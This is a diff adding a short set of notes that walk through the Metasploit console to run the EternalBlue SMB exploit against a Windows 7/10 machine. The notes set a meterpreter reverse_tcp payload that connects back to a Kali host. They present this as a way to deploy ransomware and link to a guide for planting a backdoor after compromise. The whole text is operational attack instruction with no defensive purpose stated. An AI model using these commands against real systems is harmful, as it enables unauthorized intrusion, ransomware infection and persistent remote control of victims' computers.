@@ -1,0 +1,21 @@
+To execute runsomeware use the metaspolit: 
+
+Hacking Window7/10 
+On Kali, type msfconsole
+-	Enter, msf > search eternalblue   
+-	Type, use exploit/windows/smb/ms17_010_eternalblue
+-	Type, show options
+-	Setup the options, 
+-	msf exploit(ms17_010_eternalblue) > set rhost 192.168.159.154 // the remote host/victim (windows 7/7)         
+-	msf exploit(ms17_010_eternalblue)> set rport 445   // the SMB port of the remote host
+-	msf exploit(ms17_010_eternalblue)> set lhost 192.168.159.150 // the Local Host (Kali)         
+-	Type, show options, to check the options are entered correctly,
+
+-	Type, msf exploit(ms17_010_eternalblue)> show payloads to select from. 
+-	Type, msf exploit(ms17_010_eternalblue)>  set payload windows/x64/meterpreter/reverse_tcp
+-	Type, msf exploit(ms17_010_eternalblue)>   exploit  // Launch the exploitation
+
+
+To execute backdoor use this link: 
+https://www.hacking-tutorial.com/hacking-tutorial/5-steps-to-set-up-backdoor-after-successfully-compromising-target-using-backtrack-5/#sthash.QgjjbNYM.dpbs 
+
